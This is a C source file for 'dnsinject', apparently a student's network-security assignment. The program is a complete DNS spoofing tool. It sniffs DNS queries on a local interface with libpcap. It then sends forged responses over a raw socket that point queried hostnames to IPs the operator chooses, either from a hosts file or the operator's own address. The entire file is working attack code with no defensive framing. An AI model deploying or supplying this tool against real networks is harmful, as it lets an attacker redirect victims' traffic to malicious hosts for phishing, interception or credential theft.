//Amit Bapat
#include "dnsinject.h"

void printHelp();
void getTimestamp(struct timeval timestamp, char* str);
void printPayload(int payloadLen, char* asciiPayload, char* hexPayload);
void getPayload(char* asciiBuf, char* hexBuf, const u_char *payload, int len);
void packetHandler(u_char *args, struct pcap_pkthdr *header, u_char *packet);
char* getQuery(char* dns);
void spoofAnswer(char* dns, char* ip);
void setDnsHeader(struct dns_header* header);
void printHex(char* str, int len);
void readFile(char* file);
void getIP(char* dev);

static int count = 1;                   /* packet counter */
int sock;
char* spoofedIP = NULL;
char** ips = NULL;
char** hosts = NULL;
int sizeHosts = 0;

void printHelp() {
	printf("Usage: dnsinject [-i interface] [-f hostnames] expression\n");
	exit(0);
}

void printHex(char* str, int len) {
	int x;
	for (x = 0; x < len; x++) {
		if (x % 16 == 0)
			printf("\n");
		printf("%02x ", str[x] & 0xff);
	}
	printf("\n");
}

void readFile(char* file) {
	FILE* fp;
	char* line = NULL;
	size_t len = 0;
	int read;

	int size = 1;
	ips = malloc(size * sizeof(char*));
	hosts = malloc(size * sizeof(char*));


	fp = fopen(file, "r");
	if (fp == NULL)
		exit(0);

	while ((read = getline(&line, &len, fp)) != -1) {
		if (size != 1) {
			ips = realloc(ips, size * sizeof(char*));
			hosts = realloc(hosts, size * sizeof(char*));
		}
		int x = 0;		
		while (line[x] != ' ') {
			x++;
		}
		ips[size-1] = calloc(x+1, 1);
		memcpy(ips[size-1], line, x);

		while (line[x] == ' ') {
			x++;
		}
		int hostOffset = x;
		while (line[x] != '\n' && line[x] != '\0') {
			x++;
		}
		hosts[size-1] = calloc(x+1, 1);
		memcpy(hosts[size-1], line + hostOffset, x - hostOffset);

		size++;
	}
	sizeHosts = size-1;
	fclose(fp);
}

void getIP(char* dev) {
	struct ifaddrs *ifap;
	if (getifaddrs(&ifap) == -1) {
		perror("Error getting IP");
		exit(1);
	}
	int s;
	char host[1024];
	struct ifaddrs* ptr = ifap;
	while (ptr != NULL) {
		if (ptr->ifa_addr->sa_family == AF_INET && strcmp(ptr->ifa_name, dev) == 0) {
			struct sockaddr_in* addr = (struct sockaddr_in*) ptr->ifa_addr;
			spoofedIP = strdup(inet_ntoa(addr->sin_addr));
		}
		ptr = ptr->ifa_next;
	}
	freeifaddrs(ifap);
}

void getTimestamp(struct timeval timestamp, char* str) {
	char buf[64];
	struct tm* now = localtime(&(timestamp.tv_sec));
	strftime(buf, sizeof buf, "%Y-%m-%d %H:%M:%S", now);
	sprintf(str, "[%s.%06ld]\n", buf, (long int)timestamp.tv_usec);
}

void getPayload(char* asciiBuf, char* hexBuf, const u_char *payload, int len) {
	int x;
	for (x = 0; x < len; x++) {
		if (isprint(*(payload+x)))
			sprintf(asciiBuf+x, "%c", *(payload+x));
		else
			asciiBuf[x] = '.';

		//sprintf(hexBuf+x, "%02x ", *(payload+x));
	}

	memcpy(hexBuf, payload, len);
}

void printPayload(int payloadLen, char* asciiPayload, char* hexPayload) {
	int x = 0;
	int len = payloadLen;
	while (x < len) {
		int y;
		int start = x;
		printf("\t");
		for (y = 0; y < 16 && x < len; y++){
			printf("%02x ", *(hexPayload+x) & 0xff);
			x++;
		}
		if (y < 16) {
			for (; y < 16; y++) {
				printf("   ");
			}
		}
		x = start;
		printf(" ");
		for (y = 0; y < 16 && x < len; y++) {
			printf("%c", *(asciiPayload+x));
			x++;
		}
		printf("\n");
	}
}

void packetHandler(u_char *args, struct pcap_pkthdr *header, u_char *packet) {
	struct ether_header *ethernet;  /* The ethernet header */
	struct sniff_ip *ip;              /* The IP header */
	//timestamp
	char buf[64];
	struct timeval timestamp = header->ts;
	getTimestamp(timestamp, buf);

	int size_ip;
	//dont care about ethernet

	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET_HEADER);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		return;
	}
	uint16_t len = ntohs(ip->ip_len);
	
	char* sourceIP = strdup(inet_ntoa(ip->ip_src));
	char* destIP = strdup(inet_ntoa(ip->ip_dst));
	
	//spoof
	ip->ip_src.s_addr = inet_addr(destIP);
	ip->ip_dst.s_addr = inet_addr(sourceIP);
	ip->ip_len = ntohs(len+DNSA_LEN); //query and response
	
	/* Only care about UDP */	
	if (ip->ip_p != IPPROTO_UDP) {
		free(sourceIP);
		free(destIP);
		return;
	}

	struct udphdr *udp;            /* The UDP header */
	u_char *payload;               /* Packet payload */
	int size_payload;	
	int size_udp = SIZE_UDP_HEADER;

	udp = (struct udphdr*)(packet + SIZE_ETHERNET_HEADER + size_ip);
	
	uint16_t sourcePort = ntohs(udp->uh_sport);
	uint16_t destPort = ntohs(udp->uh_dport);
	payload = (u_char *)(packet + SIZE_ETHERNET_HEADER + size_ip + size_udp);
	size_payload = len - (size_ip + size_udp);

	if (sourcePort != 53 && destPort != 53) {
		free(sourceIP);
		free(destIP);
		return;//we dont care
	}

	//spoof
	udp->uh_sport = htons(53);
	udp->uh_dport = htons(sourcePort);
	udp->uh_sum = 0; //disable
	udp->uh_ulen = (udp->uh_ulen + ntohs(DNSA_LEN));
	
	//extract DNS info, only fields we care about
	struct dns_header* dnsHeader = (struct dns_header*)(payload);
	char* dns = (char*) (payload + sizeof(struct dns_header));
	int packetSize = len + DNSA_LEN;

	if ((int) getBit(dnsHeader->flags[0], 8) != 0) {
		free(sourceIP);
		free(destIP);
		return; //not a query
	}

	char* query = getQuery(dns);
	if (query == NULL) {
		free(sourceIP);
		free(destIP);
		return; //no spoof
	}
	printf("\nQUERY: %s\n", query);
	
	//get spoofed packet
	setDnsHeader(dnsHeader);
	char* spoof = (char*) calloc(packetSize, 1);
	memcpy(spoof, ip, len); //copies IP hdr and onwards
	char* dnsAns = spoof + len;
	if (ips == NULL) {
		spoofAnswer(dnsAns, spoofedIP);
	} else {
		//check query to see if it matches hosts file
		int x;
		int flag = 0;
		for (x = 0; x < sizeHosts; x++) {
			if (strcmp(query, hosts[x]) == 0) {
				spoofAnswer(dnsAns, ips[x]);
				flag = 1;
				break;
			}
		}
		if (flag == 0)
			spoofAnswer(dnsAns, spoofedIP);
	}

	printf("Sending to %s Port %d\n", sourceIP, sourcePort);
	int sent = sendSocket(spoof, packetSize, sourcePort, sourceIP);
	printf("Sent %d bytes\n", sent);
	
	//free data structures
	free(query);
	free(sourceIP);
	free(destIP);
	free(spoof);
}

int sendSocket(char* packet, int len, int port, char* dest) {
	//printHex(spoof, packetSize);
	struct sockaddr_in to_addr;
	to_addr.sin_family = AF_INET;
	to_addr.sin_port = htons(port);
	to_addr.sin_addr.s_addr = inet_addr(dest);

	int sent = sendto(sock, packet, len, 0, (struct sockaddr *)&to_addr, sizeof(to_addr)); 
	if (sent < 0) {
		perror("Error in sending packet");
		exit(1);
	}
	return sent;
}

void setDnsHeader(struct dns_header* header) {
	memcpy(header->flags, "\x81\x80", 2); //flags
	memcpy(header->ancount, "\x00\x01", 2); //ancount
	memcpy(header->nscount, "\x00\x00", 2); //nscount
	memcpy(header->arcount, "\x00\x00", 2); //arcount

}

void spoofAnswer(char* dns, char* ip) {
	int arr[4];
	char IP[4];
	//read IP into int
	printf("Injecting IP %s\n", ip);
	sscanf(ip, "%d.%d.%d.%d", (int*)&arr[0], (int*)&arr[1], (int*)&arr[2], (int*)&arr[3]);
	//cast ints to hex
	int x;
	for (x = 0; x < 4; x++)
		IP[x] = (char) arr[x];

	//dns answer
	memcpy(dns, "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
	memcpy(&dns[12], IP, 4);
}

char* getQuery(char* dns) {
	int x;
	char* query;

	int len = strlen(dns);
	query = calloc(len, 1);
	memcpy(query, dns+1, len-1);

	x = (int) *dns;
	while(query[x] != '\0') {
		int temp = (int) *(query + x);
		query[x] = '.';
		x += temp + 1;
	}
	len += 1; //include null at end
	int type = (int) *(dns + len + 1);
	if (type != 1) {
		free(query);
		return NULL;
	}

	return query;
}


int main(int argc, char** argv) {
	bpf_u_int32 mask;			// The netmask of our sniffing device 
	bpf_u_int32 ip;				// The IP of our sniffing device 
	struct bpf_program fp;		// The compiled filter expression
	int numPackets = 0;		// How many packets to sniff for

	char* interface = NULL;
	char* file = NULL;
	char* str = NULL;
	char* filter = NULL;

	opterr = 0;
	char c;
	//parse arguments
	while ((c = getopt(argc, argv, "i:f:")) != -1) {
		switch(c) {
			case 'i':
				if (optarg == NULL)
					printHelp();
				interface = optarg;
				break;
			case 'f':
				if (optarg == NULL)
					printHelp();
				file = optarg;
				break;
			default:
				printHelp(); //should exit program
				break;
		}
	}

	if (optind < argc) {
		filter = argv[optind];
	}

	//printf("interface = %s, file = %s, string = %s, expression = %s\n", interface, file, str, filter);

	char *dev = NULL, errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;

	if (file != NULL) {
		readFile(file);
	}
	if (interface != NULL) {
		dev = interface;
	} else {
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			return(1);
		}
	}
	
	printf("Device: %s\n", dev);
	getIP(dev);
	printf("IP: %s\n", spoofedIP);

	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(1);
	}

	if (filter != NULL) {
		if (pcap_lookupnet(dev, &ip, &mask, errbuf) == -1) {
			fprintf(stderr, "Can't get netmask for device %s\n", dev);
			return(1);
		}
		if (pcap_compile(handle, &fp, filter, 0, ip) == -1) {
			fprintf(stderr, "Couldn't parse filter %s: %s\n", filter, pcap_geterr(handle));
			return(1);
		}
		if (pcap_setfilter(handle, &fp) == -1) {
			fprintf(stderr, "Couldn't install filter %s: %s\n", filter, pcap_geterr(handle));
			return(1);
		}
	}
	
	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int optval = 1;
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0) {
		perror("Error in setsockopt");
		exit(0);
	}

	//packet capture
	int ret = pcap_loop(handle, numPackets, packetHandler, str);
	if (ret == -1)
		pcap_perror(handle, "ERROR");
	
	if (filter != NULL) {
		pcap_freecode(&fp);
	}

	pcap_close(handle);
	free(spoofedIP);
	return 0;
}